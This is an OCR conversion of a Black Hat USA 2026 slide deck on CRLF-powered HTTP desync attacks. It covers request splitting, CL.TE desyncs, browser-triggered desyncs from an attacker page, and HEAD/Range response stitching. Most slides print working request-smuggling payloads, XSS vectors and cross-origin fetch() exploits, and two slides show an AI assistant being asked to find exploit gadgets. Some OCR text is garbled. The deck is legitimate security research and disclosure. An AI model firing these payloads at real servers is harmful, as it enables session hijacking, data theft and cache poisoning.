---
title: "CRLF-Powered Desync Attacks Beheading HTTP Streams"
speakers: ["t0xodile", "mastersplinter"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/t0xodile&mastersplinter_CRLF-Powered Desync Attacks Beheading HTTP Streams.pdf"
pages: 111
sha256: "67b82f72047daa6fb30138d432e747ce62909d7afe94b6ebe1449e4f75cb099d"
text_chars: 40632
ocr_pages: 2
has_ocr: true
redacted_secrets: 0
ocr_confidence: 88.6
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:49:05Z"
---
# CRLF-Powered Desync Attacks Beheading HTTP Streams

**Speakers:** t0xodile, mastersplinter  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/t0xodile&mastersplinter_CRLF-Powered Desync Attacks Beheading HTTP Streams.pdf` (111 pages)


## Slide 1


> Recovered by OCR — confidence 89/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CRLF-Powered [xe
Desync Attacks
Beheading HTTP Streams
Host: victim.com
Tom Stacey & Tobia Righi
@tOxodile / @m4st3rsplint3r
```

## Slide 2

## **The Request Header Injection Impact Gap**

GET /%20HTTP/1.1%0d%0aX-Host:%20attacker.com%0d%0aX:%20x HTTP/1.1 Host : example.com

HTTP/1.1 3 01 Moved Permanently Location : https://attacker.com

**2%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 3

## **The Request Header Injection Impact Gap**

GET /%20HTTP/1.1%0d%0aX-Host:%20attacker.com%0d%0aX:%20x HTTP/1.1 Host : example.com

HTTP/1.1 3 01 Moved Permanently Location : https://attacker.com

**3%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 4

## **Research Origins**

**Antoine Roly** @aroly.bsky.social · 11mo Request splitting is actually not that uncommon. I found it a couple of times but the exploitation is sometimes tricky.

**Antoine Roly** @aroly.bsky.social · 17 Jan 25 I recently found a cool HTTP request splitting bug. I find it interesting so I wanted to share it.

**4%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 5

## **The Research Gap**

Making HTTP header injection critical via response queue poisoning James Kettle - 2022

Creating a desync using header injection

Only 1 vulnerable application mentioned

HTTP Request Splitting Vulnerabilities Exploitation Sergey Bobrov - 2023

Many many vulnerable applications Desyncs mentioned, but not used

**5%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 6

## **Outline**

- HTTP Request Splitting

- CRLF-Powered CL.TE Desyncs

- Browser-Powered CRLF Desyncs

- Response Header Injection

- Defence

- Further Research

- Key Takeaways

**5%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 7

## **HTTP/1.1’s Fatal Flaw**

GET / HTTP/1.1 Host : example.com Transfer-Encoding : chunked Content-Length : 35 0 GET /robots.txt HTTP/1.1 X: x

GET / HTTP/1.1 Host : example.com

HTTP/1.1 200 OK

HTTP/1.1 200 OK Disallow: /

**6%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 8

## **HTTP/1.1’s Fatal Flaw**

GET /robots

robots.txt
prefix

**7%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 9

## **HTTP Request Header Injection**

**proxy_pass** sends request to backend **$uri;** executes Nginx’s **normalize** function # nginx.conf GET /test/../a/. GET /a location / { proxy_pass http://backend$uri; GET /test/// GET /test/ } GET /test%2f GET /test/ GET /test%0d%0a GET /test<?><?>

**8%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 10

## **HTTP Request Header Injection**

GET /%20HTTP/1.1%0d%0aContent-Length:%20-1%0d%0aX:%20x HTTP/1.1

GET / HTTP/1.1 Content-Length: -1 X: x HTTP/1.1 Host: example.com

400 Bad Request

**9%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 11

## **HTTP Request Header Injection**

GET /%20HTTP/1.1%0d%0aContent-Length:%20-1%0d%0aX:%20x HTTP/1.1

GET / HTTP/1.1 Content-Length: -1 X: x HTTP/1.1 Host: example.com

400 Bad Request

GET /<@urlencode_all> HTTP/1.1 GET / § HTTP/1.1 Content-Length: -1 Content-Length: -1 X: x</@urlencode_all> HTTP/1.1 X: x§ HTTP/1.1 Host: example.com Host: example.com

**10%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 12

## **Detecting Request Header Injection**

GET / § HTTP/13.37 Foo: bar§ HTTP/1.1

HTTP/1.1 505 Version Not Supported

GET / § HTTP/1.1 Transfer-Encoding: x Foo: bar§ HTTP/1.1

HTTP/1.1 501 Not Implemented

**11%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 13

**HTTP Request Splitting**

## Slide 14

## **HTTP Request Splitting**

GET / § HTTP/1.1 Host: example.com Connection: keep-alive TRACE / HTTP/1.1 X: x§ HTTP/1.1 Host: example.com

HTTP/1.1 200 OK HTTP/1.1 200 OK HTTP/1.1 200 OK HTTP/1.1 200 OK HTTP/1.1 405 …

**13%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 15

## **Response Queue Poisoning via Request Splitting**

GET / § HTTP/1.1 Host: example.com HTTP/1.1 200 OK GET / HTTP/1.1 Foo: bar§ HTTP/1.1 Host: example.com GET / HTTP/1.1 HTTP/1.1 200 OK Host: example.com GET / § HTTP/1.1 Host: example.com GET / HTTP/1.1 HTTP/1.1 200 OK Foo: bar§ HTTP/1.1 Set-Cookie: sess=abcde Host: example.com

**14%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 16

## **RQP Inside the Infrastructure of a CDN**

GET / § HTTP/1.1
Host: blue.net
GET / HTTP/1.1 GET / HTTP/1.1
Foo: bar§ HTTP/1.1 Host: blue.net
Host: blue.net
GET / HTTP/1.1
Host: blue.net
Desync here
Split into  exactly
two requests

**14%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 17

## **RQP Inside the Infrastructure of a CDN**

GET / HTTP/1.1
Host: blue.net
GET / HTTP/1.1
Host: blue.net
HTTP/1.1 200 OK
X-Powered-By: ASP.NET
Desync here
HTTP/1.1 200 OK
X-Powered-By: Express
Different
tech stacks
HTTP/1.1 200 OK
X-Powered-By: Next.js
Split into  exactly
two requests

**15%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 18

Routed to blue.net
Capturing Requests Inside of a CDN
GET / § HTTP/1.1
Host: blue.net
POST /user/save HTTP/1.1
Host: storage.net
POST /user/save HTTP/1.1
Cookie: SESSID=abcdefg
Host: storage.net
Content-Length: 5000
Cookie: SESSID=abcdefg
Routed to storage.net
Content-Length: 5000 store= HTTP/1.1
store=§ HTTP/1.1
Desync here
GET / HTTP/1.1
Host: blue.net

## **Capturing Requests Inside of a CDN**

**16%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 19

Routed to blue.net POST /user/save HTTP/1.1 Host: storage.net Cookie: SESSID=abcdefg Content-Length: 5000 Routed to storage.net store= HTTP/1.1

## **Capturing Requests Inside of a CDN**

GET / § HTTP/1.1
Host: blue.net
POST /user/save HTTP/1.1
Host: storage.net
POST /user/save HTTP/1.1
Cookie: SESSID=abcdefg
Host: storage.net
Content-Length: 5000
Cookie: SESSID=abcdefg
Content-Length: 5000 store= HTTP/1.1
store=§ HTTP/1.1
HTTP/1.1 200 OK
... Desync here
<input value="HTTP/1.1
Host: storage.net
Random live user’s
request stored here
GET /profile HTTP/1.1
Cookie: SESSID=hijklmno

**17%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 20

## **Header Injection via Custom Upstream Header**

GET /%0d%0aHost:%20tele.com%0d%0a%0d%0a HTTP/1.1 Host: tele.com

HTTP/1.1 400 Bad Request

**18%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 21

## **Header Injection via Custom Upstream Header**

GET /%0d%0aHost:%20x HTTP/1.1 Host: tele.com

GET / HTTP/1.1 Host: tele.com HTTP/1.1 400 Bad Request X-Original-Url: / Host: x Injection in header

**19%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 22

## **Header Injection via Custom Upstream Header**

GET /%0d%0aHost:%20x HTTP/1.1 Host: tele.com

GET / HTTP/1.1 Host: tele.com HTTP/1.1 400 Bad Request X-Original-Url: / Host: x Injection in header

OPTIONS /§ GET / HTTP/1.1 Host: tele.com § HTTP/1.1 Host: tele.com

OPTIONS / HTTP/1.1 Host: tele.com X-Original-Url: / GET / HTTP/1.1 Host: tele.com

**20%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 23

## **Header Injection via Custom Upstream Header**

$20,000

GET /%0d%0aHost:%20x HTTP/1.1 Host: tele.com

GET / HTTP/1.1 Host: tele.com X-Original-Url: / Host: x

HTTP/1.1 400 Bad Request Injection in header

OPTIONS /§ GET / HTTP/1.1 Host: tele.com § HTTP/1.1 Host: tele.com

OPTIONS / HTTP/1.1 Host: tele.com X-Original-Url: / GET / HTTP/1.1 Host: tele.com

HTTP/1.1 200 OK Allow: OPTIONS, GET HTTP/1.1 200 OK Allow: OPTIONS, GET HTTP/1.1 200 OK {”token”:”eyJ...”}

**21%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 24

## **Header Injection via Non-Path Insertion Points**

Injection into Injection ends up in path…? cookie

POST /graphql/v1 HTTP/1.1 POST /graphql/v1/abc 501 Not Implemented Host: payment.com Transfer-Encoding: notchunked Cookie: sess=abc§ X: x HTTP/1.1 Transfer-Encoding: notchunked Host: payment.com X: x§

**22%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 25

## **Header Injection via Non-Path Insertion Points**

Injection into Injection ends up in path…? cookie POST /graphql/v1 HTTP/1.1 POST /graphql/v1/abc 501 Not Implemented Host: payment.com Transfer-Encoding: notchunked Cookie: sess=abc§ X: x HTTP/1.1 Transfer-Encoding: notchunked Host: payment.com X: x§

POST /graphql/v1 HTTP/1.1 POST /graphql/v1/abc HTTP/1.1 Host: payment.com Host: payment.com Cookie: sess=abc § HTTP/1.1 Host: payment.com GET / HTTP/1.1 X: x HTTP/1.1 GET / HTTP/1.1 Host: payment.com X: x§

**23%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 26

## **Header Injection via Non-Path Insertion Points**

Injection into Injection ends up in path…? cookie

POST /graphql/v1 HTTP/1.1 POST /graphql/v1/abc Host: payment.com Transfer-Encoding: notchunked Cookie: sess=abc§ X: x HTTP/1.1 Transfer-Encoding: notchunked Host: payment.com X: x§

POST /graphql/v1 HTTP/1.1 Host: payment.com Cookie: sess=abc § HTTP/1.1 Host: payment.com GET / HTTP/1.1 X: x§

POST /graphql/v1/abc HTTP/1.1 Host: payment.com GET / HTTP/1.1 X: x HTTP/1.1 Host: payment.com

**Wictor**

501 Not Implemented

HTTP/1.1 200 OK

HTTP/1.1 200 OK ACAO: x.ecom {”card_num”:”...”} HTTP/1.1 200 OK ACAO: y.ecom {”card_num”:”...”}

**23%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 27

### Hey Claude, what headers produce predictable response codes?

**24%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**


> Recovered by OCR — confidence 89/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
p— Claude Code v2.1.177 )
Tips for getting started
Welcome back splinter! Run /init to create a CLAUDE.md file with instructions for Claude
Note: You have launched claude in your home directory. For the be
even with “ANTHRO
‘w> key in ~“/copy” to write the f
cused sel
Opus 4.8 (1M context) * Claude Max
tobia@turtlesec.io's Organization
/home/splinter
* Crunched for 22s
ct
n
```

## Slide 28

### Hey Claude, what headers produce predictable response codes?

Expect: asdf

GET / § HTTP/1.1 Expect: asdf X: x§ HTTP/1.1 Host: example.com

HTTP/1.1 417 Expectation Failed

**25%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 29

## **Request Splitting Blocked**

GET / § HTTP/1.1 Host: example.com GET / HTTP/1.1 Foo: bar§ HTTP/1.1 Host: example.com

\r\n\r\n

GET / § HTTP/1.1 Random_header: asdf Foo: bar§ HTTP/1.1 Host: example.com

HTTP/1.1 400 Bad Request Connection: close

On any attempt to inject a second CRLF sequence

HTTP/1.1 200 OK

**26%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 30

**CRLF-Powered CL.TE Desyncs**

## Slide 31

## **Detecting CRLF-Powered CL.TE Desyncs**

POST / § HTTP/1.1 Transfer-Encoding: notchunked Foo: bar§ HTTP/1.1 Host : example.com Content-Length: 0

HTTP/1.1 501 Not Implemented HTTP/1.1 400 Bad Request

**28%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 32

## **Detecting CRLF-Powered CL.TE Desyncs**

POST / § HTTP/1.1 Transfer-Encoding: notchunked Foo: bar§ HTTP/1.1 Host : example.com Content-Length: 0

HTTP/1.1 501 Not Implemented HTTP/1.1 400 Bad Request

POST / § HTTP/1.1 Transfer-Encoding: chunked Foo: bar§ HTTP/1.1 Host: example.com Content-Length: 13 d x=y 0

–TIMEOUT–

**29%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 33

## **The Desync Disaster**

POST / § HTTP/1.1 Transfer-Encoding: chunked Foo: bar§ HTTP/1.1 Host: clothes.shop Content-Length: 66 0 POST /user/update?name=t0xodile Cookie: SESSID=abcdefg X: x

GET / HTTP/1.1 Host: clothes.shop

HTTP/1.1 200 OK

HTTP/1.1 200 OK Set-Cookie: SESSID=abcdefg Profile Updated

**30%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 34

## **The Desync Disaster**

POST / § HTTP/1.1 Transfer-Encoding: chunked Foo: bar§ HTTP/1.1 Host: clothes.shop Content-Length: 66 0 POST /user/update?name=t0xodile Cookie: SESSID=abcdefg X: x

GET / HTTP/1.1 Host: clothes.shop **CRLF-Powered Desync Attacks: Beheading HTTP Streams**

HTTP/1.1 200 OK

HTTP/1.1 200 OK Set-Cookie: SESSID=abcdefg Profile Updated

**31%**

## Slide 35

## **The Desync Disaster**

POST / § HTTP/1.1 Transfer-Encoding: chunked Foo: bar§ HTTP/1.1 Host: clothes.shop Content-Length: 66 0 POST /user/update?name=t0xodile Cookie: SESSID=abcdefg X: x

GET / HTTP/1.1 Host: clothes.shop

HTTP/1.1 200 OK

HTTP/1.1 200 OK Set-Cookie: SESSID=abcdefg Profile Updated

**32%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 36

## **The Desync Disaster**

POST / § HTTP/1.1 Transfer-Encoding: chunked Foo: bar§ HTTP/1.1 Host: clothes.shop Content-Length: 66 0 POST /user/update?email=t0x@atk.cc Cookie: SESSID=abcdefg Attacker email X: x GET / HTTP/1.1 Host: clothes.shop **CRLF-Powered Desync Attacks: Beheading HTTP Streams**

$2,200

HTTP/1.1 200 OK

HTTP/1.1 200 OK Profile Updated

**32%**

## Slide 37

## **The Nested Response Mystery**

POST / § HTTP/1.1 Transfer-Encoding: chunked Foo: bar§ HTTP/1.1 Host: account.phones.com Content-Length: 87 0 GET / HTTP/1.1 Host: account.phones.com x-req-id: <img/src/onerror=alert(1)>

HTTP/1.1 404 Not Found Content-Type: application/octet-stream Not FoundHTTP/1.1 400 Bad Request Content-Type: application/octet-stream X-Req-Id=<img/src/onerror=alert(1)>

**33%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 38

## **The Nested Response Mystery**

POST / § HTTP/1.1 Transfer-Encoding: chunked Foo: bar§ HTTP/1.1 Host: account.phones.com Content-Length: 87 0

GET / HTTP/1.1 Host: account.phones.com x-req-id: <img/src/onerror=alert(1)>

HTTP/1.1 404 Not Found Content-Type: application/octet-stream Not FoundHTTP/1.1 400 Bad Request Content-Type: application/octet-stream X-Req-Id=<img/src/onerror=alert(1)>

HTTP/1.1 200 OK Content-Type: text/html

**@DFrojdendahl**

… </html>HTTP/1.1 400 Bad Request Content-Type: application/octet-stream X-Req-Id=<img/src/onerror=fetch()>

**34%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 39

## **The Nested Response Mystery**

$500

POST / § HTTP/1.1 Transfer-Encoding: chunked Foo: bar§ HTTP/1.1 Host: account.phones.com Content-Length: 87 0

GET / HTTP/1.1 Host: account.phones.com x-req-id: <img/src/onerror=alert(1)>

HTTP/1.1 404 Not Found Content-Type: application/octet-stream Not FoundHTTP/1.1 400 Bad Request Content-Type: application/octet-stream X-Req-Id=<img/src/onerror=alert(1)>

HTTP/1.1 200 OK Content-Type: text/html … </html>HTTP/1.1 400 Bad Request Content-Type: application/octet-stream **Victim account linked to** X-Req-Id=<img/src/onerror=fetch()> **attacker session**

**@DFrojdendahl**

**35%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 40

## **Denial of Service via Cache Poisoning**

POST / § HTTP/1.1 Transfer-Encoding: chunked Foo: bar§ HTTP/1.1 Host: cdn.doomscroll.com Content-Length: 46 0 GET /images/randomlogo.png HTTP/1.1 X: x

GET / HTTP/1.1 Host: cdn.doomscroll.com

HTTP/1.1 200 OK X-Cache: MISS HTTP/1.1 200 OK X-Cache: MISS HTTP/1.1 200 OK X-Cache: MISS HTTP/1.1 200 OK X-Cache: MISS

HTTP/1.1 200 OK X-Cache: HIT <image>

**36%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 41

## **The HEAD Technique**

POST / § HTTP/1.1 Transfer-Encoding: chunked Foo: bar§ HTTP/1.1 Host: cdn.doomscroll.com Content-Length: 107 0 HEAD / HTTP/1.1 GET / HTTP/1.1 X-Reflect:<img/src/onerror=fetch()> Content-Length: 100 x=y

HEAD / HTTP/1.1 Host: cdn.doomscroll.com

GET / HTTP/1.1 X-Reflect: <img/src/onerror=fetch()> Content-Length: 100 x=y

**37%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 42

## **The HEAD Technique**

GET / HTTP/1.1 Host: cdn.doomscroll.com

GET / HTTP/1.1 X-Reflect: <img/src/onerror=fetch()> Content-Length: 100 x=y

**Waiting for bytes** HTTP/1.1 200 OK Content-Type: text/html Content-Length: 54

**38%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 43

## **The HEAD Technique**

GET / HTTP/1.1 X-Reflect: <img/src/onerror=fetch()> Content-Length: 100 x=yGET / HTTP/1.1 Host: cdn.doomscroll.com

Victim’s req appended to prefix

**Waiting for bytes**

HTTP/1.1 200 OK Content-Type: text/html Content-Length: 54

**39%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 44

## **The HEAD Technique**

GET / HTTP/1.1 X-Reflect: <img/src/onerror=fetch()> Content-Length: 100 x=yGET / HTTP/1.1 Host: cdn.doomscroll.com

Victim’s req appended to prefix **Waiting for bytes** HTTP/1.1 200 OK Content-Type: text/html Content-Length: 54 CL not long enough HTTP/1.1 204 No Content X-Reflect: <img/src/onerro

**40%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 45

## **The HEAD Technique**

HTTP/1.1 200 OK Content-Type: text/html Content-Length: 54 CL not long enough HTTP/1.1 204 No Content X-Reflect: <img/src/onerro

**41%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 46

### What Nginx response code produces a length between x and y?

414 URI Too Long

HTTP/1.1 414 URI Too Long

**41%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 47

## **AI-Generated HEAD Gadget**

POST / § HTTP/1.1 Transfer-Encoding: chunked Foo: bar§ HTTP/1.1 Host: cdn.doomscroll.com Content-Length: <correct> 0

HEAD /?<a*1000> HTTP/1.1 GET / HTTP/1.1 X-Reflect: <img/src/onerror=fetch()> Content-Length: 100 x=y

GET / HTTP/1.1 Host: cdn.doomscroll.com

HTTP/1.1 200 OK

HTTP/1.1 414 URI Too Long Content-Type: text/html Content-Length: 61 HTTP/1.1 204 No Content X-Reflect: <img/src/onerror=fetch()>

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

**42%**

## Slide 48

**Browser-Powered CRLF Desyncs**

## Slide 49

## **Browser-Powered CRLF Desyncs**

https://attacker.com GET / § HTTP/1.1 Host: example.com fetch( "https://example.com/%20HTTP/1.1%0d%0a GET / HTTP/1.1 Host:%20example.com%0d%0a%0d%0a Request Splitting Desync Foo: bar§ HTTP/1.1 GET%20/%20HTTP/1.1%0d%0a Host: example.com Foo:%20bar" ) POST / § HTTP/1.1 https://attacker.com Transfer-Encoding: chunked fetch( Foo: bar§ HTTP/1.1 "https://example.com/%20HTTP/1.1%0d%0a Host: example.com Transfer-Encoding:%20chunked%0d%0a Content-Length: 27 CL.TE Desync Foo:%20bar", { 0 method: "POST", body: "0\r\n\r\nTRACE / HTTP/1.1\r\nX: x" TRACE / HTTP/1.1 } X: x )

**44%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 50

## **CRLF-Powered Desync Worms**

XSS fires desync

**45%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 51

## **CRLF-Powered Desync Worms**

XSS fires desync

**46%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 52

**Scope-Limited Desyncs**

## Slide 53

## **HTTP Request Tunnelling**

Nginx Changelog: 24-03-2026v1.27.9 - “Change: now the ‘keepalive’ directive in the ‘upstream’ block is enabled by default.”

**48%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 54

## **Bypassing Blind Request Tunnelling**

GET / § HTTP/1.1 Host: example.com TRACE / HTTP/1.1 Foo: bar§ HTTP/1.1 Host: example.com

HTTP/1.1 200 OK TRACE response never comes back…

**49%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 55

## **Bypassing Blind Request Tunnelling**

GET / § HTTP/1.1 HTTP/1.1 200 OK Host: example.com TRACE / HTTP/1.1 Foo: bar§ HTTP/1.1 Host: example.com HTTP/1.1 100 Continue GET / § HTTP/1.1 HTTP/1.1 No Content-Length Host: example.com HTTP/1.1 200 OK Header? Expect: 100-continue HTTP/1.1 405 Method Not Allowed

GET / § HTTP/1.1 HTTP/1.1 Host: example.com Expect: 100-continue TRACE / HTTP/1.1 Foo: bar§ HTTP/1.1 Host: example.com

**50%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 56

## **Bypassing Access Controls via Request Tunnelling**

GET /config HTTP/1.1 Host: carmanufacturer.com GET /robots.txt § HTTP/1.1 Host: carmanufacturer.com Expect: 100-continue

GET /config HTTP/1.1 X: x§ HTTP/1.1 Host: carmanufacturer.com

HTTP/1.1 403 Forbidden

HTTP/1.1 100 Continue HTTP/1.1 200 OK Disallow: /HTTP/1.1 200 OK Content-Type: application/json {"config":{"...”}}

**50%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 57

## **Bypassing Response Header Removal**

GET / § HTTP/1.1 Expect: 100-continue Foo: bar§ HTTP/1.1 Host: shop.minisoft.com

HTTP/1.1 100 Continue HTTP/1.1 200 OK x-fd-int-roxy-origin-ip: <redacted> x-fd-int-roxy-origin-name: <redacted> x-fd-int-roxy-origin-url: <redacted> x-fd-int-roxy-upstream-error-info: <redacted> x-fd-int-roxy-originshield-parent: <redacted>

**51%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 58

**Browser-Powered CRLF Desyncs**

## Slide 59

## **Browser-Powered 0.CL - Streaming Service**

Same keep-alive connection Same keep-alive connection
GET /images/ § HTTP/1.1 HTTP/1.1 200 OK
Content-Length: 7
X: x§ HTTP/1.1
Host: secure.streaming.com
Connection: keep-alive
GET /images/ § HTTP/1.1 HTTP/1.1 400 Bad Request
Content-Length: 7
X: x§ HTTP/1.1
Host: secure.streaming.com
Connection: keep-alive CL header eats
7 bytes off next
request

**53%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 60

## **Browser-Powered 0.CL - Streaming Service**

Same keep-alive connection Same keep-alive connection

GET /images/ § HTTP/1.1 Content-Length: 23 X: x§ HTTP/1.1 Host: secure.streaming.com Connection: keep-alive

HTTP/1.1 200 OK

GET /images/ § HTTP/1.1 HEAD /50x.html HTTP/1.1 Host: localhost

**23 bytes**

GET /status<svg/onload=alert(1)> HTTP/1.1 Host: secure.streaming.net § HTTP/1.1 Host: secure.streaming.com Connection: keep-alive

**HTTP/1.1 200 OK Content-Type: text/html HTTP/1.1 307 Temporary Redirect Location: /status<svg/onload=alert(1)>**

**54%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 61

## **Browser-Powered 0.CL - Streaming Service**

https://attacker.com

1. window.open()

https://secure.streaming.com/%20HTTP/1.1%0d%0a Content-Length:%2023%0d%0aX:%20x

This allows us to inject a Content-Length header cross-origin, leaving the backend waiting for more bytes. GET / HTTP/1.1 Content-Length: 23 X: x HTTP/1.1 Host: secure.streaming.com Connection: keep-alive

**55%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 62

## **Browser-Powered 0.CL - Streaming Service**

**https://attacker.com**

Same keep-alive connection

https://secure.streaming.com/%20HTTP/1.1%0d%0aContent1.1. window.window.openopen()() Length:%2023%0d%0aX:%20x 2. location =

2. location =

https://secure.streaming.com/images/%20HTTP/1.1%0d%0aH EAD%20/50x.html%20HTTP/1.1%0d%0aHost:%20localhost%0d%0 a%0d%0aGET%20/status%3Csvg/onload=alert(1)%3E%20HTTP/1 .1%0d%0aHost:%20secure.streaming.net%0d%0a%0d%0a

**56%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 63

## **Browser-Powered 0.CL - Streaming Service**

https://secure.sthttps://attacke r .comeaming.com
1. window.open()
2. location =

Same keep-alive connection HTTP/1.1 200 OK HTTP/1.1 200 OK Content-Type: text/html HTTP/1.1 307 Temporary Redirect Location: /status<svg/onload=alert(1)>

**57%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 64

## **Browser-Powered 0.CL - Streaming Service**

$5,000

All this effort… for XSS Show this to a developer that just finished implementing DOMPurify

**58%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 65

## **Browser-Powered Request Splitting**

**GET /docs/index.html** **§? HTTP/1.1 Host: proxy.account.software.com Expect: 100-continue TRACE / HTTP/1.1 X: x§ HTTP/2 Host: proxy.account.software.com**

**HTTP/2 100 Continue HTTP/1.1 200 OK**

**59%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 66

## **Browser-Powered Request Splitting**

GET /docs/index.htGET /docs/index.html ml§? HTTP/1.1§? HTTP/1.1 Host: proxy.account.software.comHost: proxy.account.software.com Expect: 100-continueExpect: 100-continue TRACE / HTTP/1.1TRACE / HTTP/1.1 X: xX: x§§ HTTP/2HTTP/2 Host: proxy.account.software.comHost: proxy.account.software.com

HTTP/2 100 ContinueHTTP/2 100 Continue HTTP/1.1 200 OKHTTP/1.1 200 OK HTTP/2 100 ContinueHTTP/2 100 Continue HTTP/1.1 200 OKHTTP/1.1 200 OK

**59%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 67

## **Browser-Powered Request Splitting**

GET /docs/index.html §? HTTP/1.1 Host: proxy.account.software.com Expect: 100-continue TRACE / HTTP/1.1 X: x§ HTTP/2 Host: proxy.account.software.com

HTTP/2 100 Continue HTTP/1.1 200 OK HTTP/2 100 Continue HTTP/1.1 200 OK HTTP/2 100 Continue HTTP/1.1 200 OK

**60%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 68

## **Browser-Powered Request Splitting**

GET /docs/index.html §? HTTP/1.1 Host: proxy.account.software.com Expect: 100-continue TRACE / HTTP/1.1 X: x§ HTTP/2 Host: proxy.account.software.com

HTTP/2 100 Continue HTTP/1.1 200 OK HTTP/2 100 Continue HTTP/1.1 200 OK HTTP/2 100 Continue HTTP/1.1 200 OK

HTTP/2 405 Method Not Allowed

**61%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 69

## **Browser-Powered Request Splitting**

GET /docs/index.html §? HTTP/1.1 Host: proxy.account.software.com Expect: 100-continue HEAD /docs/index.html HTTP/1.1 Range: bytes=1-2 X: x§ HTTP/2 Host: proxy.account.software.com

HTTP/1.1 206 Partial Content Content-Type: text/html Content-Range: bytes 1-2/XXXXX Content-Length: 2 We control how much the ht frontend will over-read

Any request we add after HEAD will have its full response concatenated as the body of the 206 Partial Content response

**62%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 70

## **Browser-Powered Request Splitting**

- Right now we can:

- Stitch together arbitrary responses.

- Control how much the upstream will read using Range.

- **We need a reflection gadget!**

**63%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 71

## **Browser-Powered Request Splitting**

Right now we can:

- Stitch together arbitrary responses.

- Control how much the upstream will read using Range.

**We need a reflection gadget!**

POST /docs/ HTTP/1.1 HTTP/1.1 400 Bad Request Host: proxy.account.software.com Content-Length: 21 "Unexpected token '<', \"<img/src=x/onerror=a>\"... is not valid JSON" <img/src=x/onerror=a>

**64%**

**CRLF-Powered Desync Attacks: Beheading HTTP Streams**

## Slide 72

## **Browser-Powered Request Splitting**

GET /docs/index.html §? HTTP/1.1 Host: proxy.account.software.com Expect: 100-continue Range: bytes=1-2 HEAD /docs/ HTTP/1.1 Host: proxy.account.software.com Range: bytes=1-650 POST /docs/ HTTP/1.1 Host: proxy.account.software.com Content-Length: 20

